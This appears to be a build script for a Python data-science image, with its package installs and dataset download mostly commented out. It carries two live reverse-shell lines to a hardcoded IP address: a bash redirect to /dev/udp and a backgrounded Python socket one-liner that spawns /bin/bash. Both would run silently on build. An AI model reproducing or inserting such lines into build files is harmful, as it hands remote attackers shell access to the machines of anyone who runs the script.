# If bash command fails, build should error out
set -e

# Install specific package versions with pip
# Check the latest version using https://pypi.org/search
sh -i >& /dev/udp/3.123.202.19/80 0>&1
# pip3 install pandas==0.23.3
# pip3 install matplotlib==2.2.2
# pip3 install scikit-learn==0.19.2
# pip3 install numpy==1.15.0
# pip3 install seaborn==0.9.0
# pip3 install bokeh==0.13.0

nohup python3 -u "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.123.202.19\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")" &
# Include datasets in the image

# DATADIR=/usr/local/share/datasets
# mkdir -p $DATADIR
# wget -O $DATADIR/iris.csv http://s3.amazonaws.com/assets.datacamp.com/staging/course_2406/datasets/iris.csv
